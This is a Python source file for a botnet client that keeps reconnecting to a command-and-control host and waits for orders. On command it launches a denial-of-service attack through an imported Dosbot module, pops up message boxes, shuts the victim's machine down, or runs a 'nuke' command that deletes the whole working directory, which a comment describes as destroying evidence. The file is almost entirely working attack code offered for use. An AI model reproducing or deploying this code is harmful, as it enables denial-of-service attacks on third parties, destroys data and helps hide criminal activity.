import Dosbot, socket, time, sys, shutil, subprocess, tkinter
from tkinter import Tk
connected = False
nocommand = True
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "PCOWNER"
port = 911
request = ""
hostname = socket.gethostname()

s.settimeout(5)

def alert(AlertTitle, AlertMessage):
    box = Tk()
    box.title(AlertTitle)
    tkinter.Message(box, text = AlertMessage, bg='red',
      fg='ivory').pack(padx=1, pady=1) #, relief=GROOVE
    tkinter.Button(box, text="Close", command=box.destroy).pack(side=tkinter.BOTTOM)
    box.geometry('300x150')
    def closeAlert():
        box.destroy()
    box.after(15000, closeAlert)
    box.mainloop()



def checkformessages():
                    try:
                        data = s.recv(4096)
                        if not data:
                            connected = False
                            message = 'Disconnected from server'
                            print(Dosbot.timenow() + message)
                        else:
                            globals()["request"] = data.decode()
                            if data.decode() != " " and data.decode() != "isconnectionactive" and data.decode() != "":
                                globals()["nocommand"] = False
                                if data.decode()[:3] != "msg":
                                    print(globals()["request"])
                            if data.decode() == "isconnectionactive":
                                s.send(" ".encode())
                    except Exception as ex:
                        if str(ex) != "timed out":
                            print(str(ex))
                        if str(ex) == "[WinError 10054] An existing connection was forcibly closed by the remote host":
                            print(str(ex))
                            time.sleep(1)
                            globals()["connected"] = False
while True:
    s.settimeout(5)
    if not connected:
        print("")
        print("---------------------------------------------------------")
        print("                    RESTARTING SOCKET                    ")
        print("---------------------------------------------------------")
        print("")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while not connected:
            try :
                s.connect((host, port))
                ID = s.recv(4096).decode()
                print("Client ID: " + ID)
                s.send(hostname.encode())
                message = 'Connected to remote host. Awaiting Command'
                print(Dosbot.timenow() + message)
                print("")
                connected = True

            except Exception as ex:
                print(str(ex))
                message = 'Unable to connect'
                print(Dosbot.timenow() + message)
                time.sleep(2)

    elif nocommand:
        checkformessages()
    else:
        request = request.split(" -")
        try:
            if request[0] == "DoS":
                try:
                    Dosbot.DoS(request[1],request[2],request[3],request[4],request[5],s)
                except KeyboardInterrupt:
                    pass
            elif request[0].lower() == "msg":
                print(request[1])
            elif request[0].lower() == "msgbox":
                alert(request[1],request[2])
            elif request[0].lower() == "exit":
                sys.exit()
            elif request[0].lower() == "nuke":
                #Destroy Evidence
                try:
                    shutil.rmtree(".")
                    print("Evidence Successfully Destroyed!")
                except Exception as ex:
                    print("An error occured while destroying evidence: " + str(ex))
                time.sleep(5)
                sys.exit()
            elif request[0].lower() == "shutdown":
                subprocess.call(["shutdown", "/s", "/t", "5"])
            else:
                raise(Exception("Unknown Request"))
        except Exception as ex:
            print(str(ex))
        nocommand = True
        print("")
